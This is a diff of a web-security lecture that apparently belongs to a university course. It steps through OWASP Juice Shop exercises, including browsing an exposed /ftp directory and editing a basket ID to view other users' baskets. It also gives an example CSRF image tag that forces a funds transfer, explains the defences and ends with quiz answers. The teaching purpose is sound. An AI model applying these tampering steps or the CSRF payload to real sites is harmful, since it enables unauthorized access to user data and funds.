-1. Head over to your Juice Shop installation, access the top-left side menu and click on the *About Us* link.
-2. Take a closer link at the hyperlink `Check out our boring terms of use if you are interested in such lame stuff`. It is a relative link `ftp/legal.md`. 
-3. Let's see whether there is something else in this `ftp` directory; all we have to do is slightly change our URL to `http://localhost:3000/ftp` (again, assuming a local installation of Juice Shop). <span class="spoiler">We can access this directory (which is a huge security issue) and more importantly, we can view the confidential document `acquisitions.md` which describes Juice Shop's plans for the coming years.</span>
+1. Head over to your Juice Shop installation, access the top-left side menu and click on the _About Us_ link.
+2. Take a closer link at the hyperlink `Check out our boring terms of use if you are interested in such lame stuff`. It is a relative link `ftp/legal.md`.
+3. Let's see whether there is something else in this `ftp` directory; all we have to do is slightly change our URL to `http://localhost:3000/ftp` (again, assuming a local installation of Juice Shop). <spoiler-info markdown="block">We can access this directory (which is a huge security issue) and more importantly, we can view the confidential document `acquisitions.md` which describes Juice Shop's plans for the coming years.</spoiler-info>
 
 #### How to avoid it
 
@@ -468,37 +478,37 @@ Of the [sensitive data exposure challenges](https://bkimminich.gitbooks.io/pwnin
 
 A malicious user, who is authorized to access a web application (e.g., a student accessing Brightspace), changes the URL (or URL parameters) to a more privileged function (e.g., from student to grader). If access is granted, **insufficient function level access control** is the culprit.
 
-Web applications often make use of *Direct Object References* when generating a HTTP response. We have already seen this in a code snippet in the [second Node.js lecture](https://chauff.github.io/Web-Teaching/nodejs2/) :point_down::
+Web applications often make use of _Direct Object References_ when generating a HTTP response. We have already seen this in a code snippet in the [second Node.js lecture](https://chauff.github.io/Web-Teaching/nodejs2/) :point_down::
 
 ```javascript
- var wishlistPriorities = {
-    high: ["Wingspan","Settlers of Catan","Azul"],
-    medium: ["Munchkin"],
-    low: ["Uno", "Scrabble"]
+var wishlistPriorities = {
+  high: ["Wingspan", "Settlers of Catan", "Azul"],
+  medium: ["Munchkin"],
+  low: ["Uno", "Scrabble"],
 };
 
-app.get('/wishlist/:priority', function (req, res, next) {
-    let list = wishlistPriorities[req.params.priority];
-    if (!list) {
-        return next();
-    }
-    res.send(list);
+app.get("/wishlist/:priority", function (req, res, next) {
+  let list = wishlistPriorities[req.params.priority];
+  if (!list) {
+    return next();
+  }
+  res.send(list);
 });
 ```
 
-Here :point_up:, we use the routing parameter `:priority` as property name of the `wishlistPriorities` object. Applications that do not verify whether a user requesting a particular route is authorized to access the route face security issues. In our concrete code example, this leads to so-called *insecure direct object references*. A malicious user can test a range of target URLs that should require authentication to determine whether this issue exists. This is especially easy for large web frameworks which come with a number of default routes enabled.
+Here :point_up:, we use the routing parameter `:priority` as property name of the `wishlistPriorities` object. Applications that do not verify whether a user requesting a particular route is authorized to access the route face security issues. In our concrete code example, this leads to so-called _insecure direct object references_. A malicious user can test a range of target URLs that should require authentication to determine whether this issue exists. This is especially easy for large web frameworks which come with a number of default routes enabled.
 
 Consider a user who accesses her wishlist using the following URL `http://mywishlist.nl/wishlist?id=234`. Nothing stops the user from also trying, e.g., `http://mywishlist.nl/wishlist?id=2425353` or `http://mywishlist.nl/wishlist?id==1`. If the id values are insecure direct object references, the user can view other users' wishlists in this manner.
 
 #### :bangbang: Juice Shop
 
-Of the [broken access control challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/broken-access-control.html) we cover the *View Basket* challenge: view another user's shopping basket.
+Of the [broken access control challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/broken-access-control.html) we cover the _View Basket_ challenge: view another user's shopping basket.
 
 1. Go to your Juice Shop and login as `Bender`.
 2. Add a few items to your shopping basket and view the basket at `http://localhost:3000/#/basket` (assuming a local installation).
-4. Open the browser's dev tools and look into the *Session Storage*. 
-5. You will find a key/value pair with key `bid` and a particular numerical value. 
-6. Change this value to some other numbers to view other customers' baskets. Since you are accessing other accounts having the same privilege level, we are here dealing with a *horizontal privilege escalation*.
+3. Open the browser's dev tools and look into the _Session Storage_.
+4. You will find a key/value pair with key `bid` and a particular numerical value.
+5. Change this value to some other numbers to view other customers' baskets. Since you are accessing other accounts having the same privilege level, we are here dealing with a _horizontal privilege escalation_.
 
 #### How to avoid it
 
@@ -508,17 +518,21 @@ Of the [broken access control challenges](https://bkimminich.gitbooks.io/pwning-
 
 ### CSRF
 
-CSRF (:speaker: *sea-surf*) stands for **Cross-Site Request Forgery**.
+CSRF (:speaker: _sea-surf_) stands for **Cross-Site Request Forgery**.
 
-In the words of OWASP: *"An attacker creates forged HTTP requests and tricks a victim into submitting them via image tags, XSS, or numerous other techniques. If the user is authenticated, the attack succeeds."*
+In the words of OWASP: _"An attacker creates forged HTTP requests and tricks a victim into submitting them via image tags, XSS, or numerous other techniques. If the user is authenticated, the attack succeeds."_
 
 Here is an example scenario: imagine a web application that allows users to transfer funds from their account to another account via a URL such as `http://mygame.nl/transferFunds?amount=100&to=342432` - the URL contains the amount and which account to send the funds to. The victim is already authenticated. An attacker constructs a request to transfer funds to her own account and embeds it in an image request stored on a site under her control :point_down::
 
 ```html
-<img src="http://mygame.nl/transferFunds?amount=1000&to=666" width="0" height="0" />
+<img
+  src="http://mygame.nl/transferFunds?amount=1000&to=666"
+  width="0"
+  height="0"
+/>
 ```
 
-If the victim accesses the website that is under the attacker's control (e.g., because the attacker sent the victim an enticing email to access the URL), the browser downloads the HTML, parses it and starts rendering. It will automatically download the image without checking whether the `src` is actually an image. The transfer of funds will then take place if the web application the user is authenticated to does not defend against a CSRF attack. 
+If the victim accesses the website that is under the attacker's control (e.g., because the attacker sent the victim an enticing email to access the URL), the browser downloads the HTML, parses it and starts rendering. It will automatically download the image without checking whether the `src` is actually an image. The transfer of funds will then take place if the web application the user is authenticated to does not defend against a CSRF attack.
 
 #### Juice Shop
 
@@ -526,20 +540,19 @@ There is no specific challenge on Juice Shop that showcases the CSRF attack as i
 
 #### How to avoid it
 
-The main reason why this attack is successful in our example is due to the server *trusting* that the request was made with this intention by the victim - the request has the correct session ID and the server responds to the request.
+The main reason why this attack is successful in our example is due to the server _trusting_ that the request was made with this intention by the victim - the request has the correct session ID and the server responds to the request.
 
-How can the server validate that this request was intentionally sent by the user? The most common approach today is via a so-called *CSRF token*, a randomly generated string, generated by the server, that is unpredictable and cannot be guessed. The server inserts this CSRF token in the response, typically in a hidden form field (**not** in a cookie). The server also keeps track of the combination of session ID and CSRF token. When the user then fills in the form and submits it to the server, the CSRF token is returned to the server and the server checks whether it matches the one it has on record. If it is a match, the server executes the requested action (e.g., changing a user's profile data) and rejects it otherwise. An attacker is not able to guess this CSRF token - as long as we do not rely on cookies to store CSRF tokens, as cookies are appended to the HTTP request automatically by the browser. Although the attacker can try to guess a valid CSRF token, it should be impossible if the server generates CSRF tokens according to best practices.
+How can the server validate that this request was intentionally sent by the user? The most common approach today is via a so-called _CSRF token_, a randomly generated string, generated by the server, that is unpredictable and cannot be guessed. The server inserts this CSRF token in the response, typically in a hidden form field (**not** in a cookie). The server also keeps track of the combination of session ID and CSRF token. When the user then fills in the form and submits it to the server, the CSRF token is returned to the server and the server checks whether it matches the one it has on record. If it is a match, the server executes the requested action (e.g., changing a user's profile data) and rejects it otherwise. An attacker is not able to guess this CSRF token - as long as we do not rely on cookies to store CSRF tokens, as cookies are appended to the HTTP request automatically by the browser. Although the attacker can try to guess a valid CSRF token, it should be impossible if the server generates CSRF tokens according to best practices.
 
 As CSRF tokens are an established line of defense, Express middleware exists (a popular option is [csurf](https://www.npmjs.com/package/csurf)) that takes care of the generation and validation of CSRF tokens.
 
 Another option for a web application to verify that a user intended a particular request are the use of reauthentication (the user is asked to authenticate again, e.g., if the request takes place at an unusual time, or at an unusual location).
 
-Going back to our example, if a user is accessing a *Win an iPAD* web site and after submitting her ticket receives a request to reauthenticate to her online banking provider, she should realize that something is off.
-
+Going back to our example, if a user is accessing a _Win an iPAD_ web site and after submitting her ticket receives a request to reauthenticate to her online banking provider, she should realize that something is off.
 
 ### Insecure components
 
-Vulnerabilities of software libraries and frameworks are continuously being discovered and patched. An application that is not patched when a vulnerability becomes known is a candidate for exploitation. It is important to be aware of the dependencies of one's Node.js application and install security patches quickly when they become available. 
+Vulnerabilities of software libraries and frameworks are continuously being discovered and patched. An application that is not patched when a vulnerability becomes known is a candidate for exploitation. It is important to be aware of the dependencies of one's Node.js application and install security patches quickly when they become available.
 
 Not only the application itself needs to be kept up-to-date, the server's operating system also needs to be continuously patched, as well as any other software used to support the web server (e.g., Redis, MongoDB, Nginx).
 
@@ -547,7 +560,7 @@ In 2018, a vulnerability called [Zip Slip](https://github.com/snyk/zip-slip-vuln
 
 #### :bangbang: Juice Shop
 
-Among the [vulnerable components challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/vulnerable-components.html) we cover the *Vulnerable Library*: inform the shop about a vulnerable library it is using.
+Among the [vulnerable components challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/vulnerable-components.html) we cover the _Vulnerable Library_: inform the shop about a vulnerable library it is using.
 
 There are many auditing tools available, a basic form of security auditing offers [`npm audit`](https://docs.npmjs.com/cli/audit), which scans all packages that depend on the application for known security issues. We first need to clone Juice Shop's GitHub repo, generate its `package-lock.json` file (which provides precise information on the required packages' dependencies) and finally run the security audit. Taken together the commands look as follows (starting with the creation of a temporary directory) :point_down::
 
@@ -560,9 +573,9 @@ There are many auditing tools available, a basic form of security auditing offer
 → npm audit
 ```
 
-Within seconds we know that several critical vulnerabilities exist, in which packages they exist, and what type of vulnerability they enable. Often, the fix seems easy: use a more recent version of an npm package. However, in practice updating an npm package can lead to a host of additional coding work due to version compatibilities. 
+Within seconds we know that several critical vulnerabilities exist, in which packages they exist, and what type of vulnerability they enable. Often, the fix seems easy: use a more recent version of an npm package. However, in practice updating an npm package can lead to a host of additional coding work due to version compatibilities.
 
-Besides `npm audit`, commercial services such as [Snyk](https://snyk.io/) and exist to aid developers in keeping their libraries and package up to date. 
+Besides `npm audit`, commercial services such as [Snyk](https://snyk.io/) and exist to aid developers in keeping their libraries and package up to date.
 
 #### How to avoid it
 
@@ -572,7 +585,7 @@ Besides `npm audit`, commercial services such as [Snyk](https://snyk.io/) and ex
 
 ### Unvalidated redirects
 
-Let's cite OWASP one last time: *"An attacker links to an unvalidated redirect and tricks victims into clicking it. Victims are more likely to click on it, since the link is to a valid site."*
+Let's cite OWASP one last time: _"An attacker links to an unvalidated redirect and tricks victims into clicking it. Victims are more likely to click on it, since the link is to a valid site."_
 
 Here is an example scenario: imagine a web application that includes a route called `redirect`. That route takes a URL as parameter and redirects to that URL. Once an attacker finds a route that enables such redirects, the attacker creates a malicious URL that redirects users to her own site for phishing, for example :point_down::
 
@@ -584,14 +597,13 @@ The user, when seeing this URL :point_up: in an email or forum, might just inspe
 
 #### :bangbang: Juice Shop
 
-
-Of the [unvalidated redirects challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/unvalidated-redirects.html) we cover the *Outdated Whitelist* challenge: attempt to redirect to a crypto currency address which is no longer included in the shop.
+Of the [unvalidated redirects challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/unvalidated-redirects.html) we cover the _Outdated Whitelist_ challenge: attempt to redirect to a crypto currency address which is no longer included in the shop.
 
 1. Head over to your Juice Shop installation and log in as any user.
-2. Check out the payment options at `http://localhost:3000/#/payment/shop` (assuming a local installation). You can also land here by following the procedure for *checking out*.
+2. Check out the payment options at `http://localhost:3000/#/payment/shop` (assuming a local installation). You can also land here by following the procedure for _checking out_.
 3. Observe that you cannot pay using a crypto currency. We know though that this used to be a feature in Juice Shop. Lets see whether we can still find it in the source code.
-4. Use the browser's dev tools and open the Debugger tab. It should show you a list of JavaScript files that our application requires. View the contents of `main-es2018.js`. 
-5. Search in `main-es2018.js` for the keyword `redirect?to`. Among other options, you will see three modes of crypto currency payments: `Bitcoin`, `Dash` and `Ether`. If you were to click on <kbd>Pay with Bitcoin</kbd> (*now unavailable*), you would be redirected to Blockchain's website without any warning. Note that here some protection is enabled: while a redirect to those three cryptocurrency URLs is possible, other redirects yield an *406 Error: Unrecognized target URL for redirect*.
+4. Use the browser's dev tools and open the Debugger tab. It should show you a list of JavaScript files that our application requires. View the contents of `main-es2018.js`.
+5. Search in `main-es2018.js` for the keyword `redirect?to`. Among other options, you will see three modes of crypto currency payments: `Bitcoin`, `Dash` and `Ether`. If you were to click on <kbd>Pay with Bitcoin</kbd> (_now unavailable_), you would be redirected to Blockchain's website without any warning. Note that here some protection is enabled: while a redirect to those three cryptocurrency URLs is possible, other redirects yield an _406 Error: Unrecognized target URL for redirect_.
 
 #### How to avoid it
 
@@ -603,22 +615,22 @@ Overall, as we have just seen, web applications offer many angles of attack. Sec
 
 Keep in mind to sanitize and validate.
 
-As a final note, the tools and libraries we have introduced in this lecture, are only a small sample of the many, many options out there. Depending on the programming language and frameworks you prefer, other tools may be a better fit. 
+As a final note, the tools and libraries we have introduced in this lecture, are only a small sample of the many, many options out there. Depending on the programming language and frameworks you prefer, other tools may be a better fit.
 
 ## Self-check
 
 Here are a few questions you should be able to answer after having followed the lecture:
 
-
 <details> 
   <summary>Consider the following list of abilities a malicious user (the attacker) may have after having managed to intercept all of your server's inbound network traffic:
 
-  - The attacker can eavesdrop (i.e. read all HTTP requests your server receives).
-  - The attacker can inject additional HTTP requests bound for your server.
-  - The attacker can modify HTTP requests bound for your server.
-  - The attacker can drop (i.e. delete) HTTP requests bound for your server. 
-  
-  You have developed a popular Web-based news-ticker application that in real-time sends the latest news (received from one hundred different news agencies) to its users when opening the news-ticker Website in the browser. Which of the listed abilities is required for an attacker to conduct a denial-of-service attack against your application?
+- The attacker can eavesdrop (i.e. read all HTTP requests your server receives).
+- The attacker can inject additional HTTP requests bound for your server.
+- The attacker can modify HTTP requests bound for your server.
+- The attacker can drop (i.e. delete) HTTP requests bound for your server.
+
+You have developed a popular Web-based news-ticker application that in real-time sends the latest news (received from one hundred different news agencies) to its users when opening the news-ticker Website in the browser. Which of the listed abilities is required for an attacker to conduct a denial-of-service attack against your application?
+
 </summary>
   None of these abilities are required.
 </details>
@@ -677,4 +689,3 @@ Here are a few questions you should be able to answer after having followed the 
 <summary>You have written a web application with a server-side component (a Node.js script). The web app requires a number of cookies (all set by the server-side component) to function properly. To minimize the chance of attack you have an idea: you develop a secret function F that computes for each cookie value a checksum. F is only known to you (the owner of the web application); F cannot be guessed. Initially when each cookie is created, the checksum is appended to the cookie value. When clients send existing cookies back to the server, your server-side component recomputes the checksum of the cookie value (without taking the appended checksum into account) - if the computed checksum is at least as large as the one sent back with the cookie, your application accepts the cookie as valid and non-malicious. How useful is this protection?</summary>
 Not very useful, the exact checksum needs to be computed to protect against cookie manipulation.
 </details>
-
